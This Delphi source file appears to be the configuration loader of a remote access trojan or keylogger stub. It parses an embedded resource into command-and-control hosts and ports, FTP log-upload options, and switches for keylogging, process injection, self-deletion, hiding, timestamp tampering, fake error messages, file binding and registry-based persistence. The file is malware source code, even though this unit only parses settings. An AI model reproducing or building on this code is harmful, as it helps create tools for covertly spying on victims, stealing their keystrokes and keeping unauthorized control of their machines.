unit UnitConfiguration;

interface

uses
  Windows, UnitFunctions, UnitConstants, UnitStringEncryption;

var
  _Hosts: array [0..4] of string;
  _Ports: array [0..4] of Word;
  _FTPOptions, _MessageParams: array[0..3] of string;
  _StartupOptions: Integer;
  _Delay, _FTPPort, _FTPDelay: Word;
  _ClientId, _StartupKey, _Password, _ServiceDesc, _MutexName,
  _ServiceName, _Foldername, _FileName, _Destination, _InjectInto: string;
  _FakeMessage, _Install, _Keylogger, _Melt, _Startup,
  _Hide, _WaitReboot, _ChangeDate, _HKCUStartup, _HKLMStartup,
  _PoliciesStartup, _Persistence, _FTPLogs, _Binded: Boolean;

function LoadConfiguration: string;

implementation
       
function ReadSettings(var Settings: string): Boolean;
var
  hResInfo, hRes: THandle;
  p: PChar;
begin
  Result := False;
  hResInfo := FindResource(0, 'CFG', RT_RCDATA);
  if hResInfo <> 0 then
  begin
    hRes := LoadResource(0, hResInfo);
    if hRes <> 0 then
    begin
      p := LockResource(hRes);
      SetString(Settings, p, SizeOfResource(0, HResInfo));
      Result := True;
    end;
    FreeResource(hRes);
  end;
end;

function LoadConfiguration: string;
var
  TmpStr: string;
begin
  if not ReadSettings(Result) then ExitProcess(0);
  TmpStr := Result;

  _Hosts[0] := Copy(TmpStr, 1, Pos('#', TmpStr)-1);
  Delete(TmpStr, 1, Pos('#', TmpStr));
  _Hosts[1] := Copy(TmpStr, 1, Pos('#', TmpStr)-1);
  Delete(TmpStr, 1, Pos('#', TmpStr));
  _Hosts[2] := Copy(TmpStr, 1, Pos('#', TmpStr)-1);
  Delete(TmpStr, 1, Pos('#', TmpStr));
  _Hosts[3] := Copy(TmpStr, 1, Pos('#', TmpStr)-1);
  Delete(TmpStr, 1, Pos('#', TmpStr));
  _Hosts[4] := Copy(TmpStr, 1, Pos('#', TmpStr)-1);
  Delete(TmpStr, 1, Pos('#', TmpStr));
  Delete(TmpStr, 1, Pos('|', TmpStr));

  _Ports[0] := StrToInt(Copy(TmpStr, 1, Pos('#', TmpStr)-1));
  Delete(TmpStr, 1, Pos('#', TmpStr));
  _Ports[1] := StrToInt(Copy(TmpStr, 1, Pos('#', TmpStr)-1));
  Delete(TmpStr, 1, Pos('#', TmpStr));
  _Ports[2] := StrToInt(Copy(TmpStr, 1, Pos('#', TmpStr)-1));
  Delete(TmpStr, 1, Pos('#', TmpStr));
  _Ports[3] := StrToInt(Copy(TmpStr, 1, Pos('#', TmpStr)-1));
  Delete(TmpStr, 1, Pos('#', TmpStr));
  _Ports[4] := StrToInt(Copy(TmpStr, 1, Pos('#', TmpStr)-1));
  Delete(TmpStr, 1, Pos('#', TmpStr));
  Delete(TmpStr, 1, Pos('|', TmpStr));

  _FTPOptions[0] := Copy(TmpStr, 1, Pos('#', TmpStr)-1);
  Delete(TmpStr, 1, Pos('#', TmpStr));
  _FTPOptions[1] := Copy(TmpStr, 1, Pos('#', TmpStr)-1);
  Delete(TmpStr, 1, Pos('#', TmpStr));
  _FTPOptions[2] := Copy(TmpStr, 1, Pos('#', TmpStr)-1);
  Delete(TmpStr, 1, Pos('#', TmpStr));
  _FTPOptions[3] := Copy(TmpStr, 1, Pos('#', TmpStr)-1);
  Delete(TmpStr, 1, Pos('#', TmpStr));
  Delete(TmpStr, 1, Pos('|', TmpStr));

  _MessageParams[0] := Copy(TmpStr, 1, Pos('#', TmpStr)-1);
  Delete(TmpStr, 1, Pos('#', TmpStr));
  _MessageParams[1] := Copy(TmpStr, 1, Pos('#', TmpStr)-1);
  Delete(TmpStr, 1, Pos('#', TmpStr));
  _MessageParams[2] := Copy(TmpStr, 1, Pos('#', TmpStr)-1);
  Delete(TmpStr, 1, Pos('#', TmpStr));
  _MessageParams[3] := Copy(TmpStr, 1, Pos('#', TmpStr)-1);
  Delete(TmpStr, 1, Pos('#', TmpStr));
  Delete(TmpStr, 1, Pos('|', TmpStr));

  _StartupOptions := StrToInt(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _Delay := StrToInt(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _FTPPort := StrToInt(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _FTPDelay := StrToInt(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr));

  _ClientId := Copy(TmpStr, 1, Pos('|', TmpStr)-1);
  Delete(TmpStr, 1, Pos('|', TmpStr));  
  _StartupKey := Copy(TmpStr, 1, Pos('|', TmpStr)-1);
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _Password := Copy(TmpStr, 1, Pos('|', TmpStr)-1);
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _ServiceDesc := Copy(TmpStr, 1, Pos('|', TmpStr)-1);
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _MutexName := Copy(TmpStr, 1, Pos('|', TmpStr)-1);
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _ServiceName := Copy(TmpStr, 1, Pos('|', TmpStr)-1);
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _Foldername := Copy(TmpStr, 1, Pos('|', TmpStr)-1);
  Delete(TmpStr, 1, Pos('|', TmpStr));   
  _FileName := Copy(TmpStr, 1, Pos('|', TmpStr)-1);
  Delete(TmpStr, 1, Pos('|', TmpStr));    
  _Destination := Copy(TmpStr, 1, Pos('|', TmpStr)-1);
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _InjectInto := Copy(TmpStr, 1, Pos('|', TmpStr)-1);
  Delete(TmpStr, 1, Pos('|', TmpStr)); 
  _FakeMessage := MyStrToBool(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr)); 
  _Install := MyStrToBool(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _Keylogger := MyStrToBool(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _Melt := MyStrToBool(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _Startup := MyStrToBool(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr));  
  _Hide := MyStrToBool(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr));      
  _WaitReboot := MyStrToBool(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _ChangeDate := MyStrToBool(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _HKCUStartup := MyStrToBool(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _HKLMStartup := MyStrToBool(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr));    
  _PoliciesStartup := MyStrToBool(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _Persistence := MyStrToBool(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _FTPLogs := MyStrToBool(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr));
  _Binded := MyStrToBool(TmpStr);
end;

end.
